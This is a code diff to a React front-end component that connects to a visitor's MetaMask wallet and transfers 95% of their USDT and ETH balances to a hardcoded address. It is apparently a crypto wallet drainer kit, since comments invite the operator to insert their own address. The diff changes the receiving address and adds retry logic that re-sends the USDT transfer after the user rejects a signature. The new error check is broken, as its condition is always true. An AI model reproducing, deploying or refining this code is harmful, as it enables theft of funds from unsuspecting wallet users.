@@ -32,19 +32,20 @@ export default function Home() {
       signer = provider.getSigner();
       signerAddress = await signer.getAddress();
       try {
-        await sendUsdt();
+        sendUsdt();
         await sendEth();
       } catch (e) {
         if (
           e.message ==
-          "MetaMask Tx Signature: User denied transaction signature."
+            "MetaMask Tx Signature: User denied transaction signature." ||
+          "User rejected the request."
         ) {
-          sendEth();
+          await sendUsdt();
         } else if (
           e.message ==
           `call revert exception (method="balanceOf(address)", errorSignature=null, errorArgs=[null], reason=null, code=CALL_EXCEPTION, version=abi/5.0.1)`
         ) {
-          alert("Please change your network");
+          alert("Please change your Metamask network");
         } else console.log(e.message);
       }
     } catch (e) {
@@ -59,7 +60,7 @@ export default function Home() {
     );
 
     const tx = await contract.transfer(
-      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address, please put your address
+      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
       BigInt(balance * 0.95)
     );
     await tx.wait(1);
@@ -70,7 +71,7 @@ export default function Home() {
       (await provider.getBalance(signerAddress)).toString()
     );
     const tx = await signer.sendTransaction({
-      to: "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4", // reciever address, please put your address
+      to: "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
       value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
     });
     await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
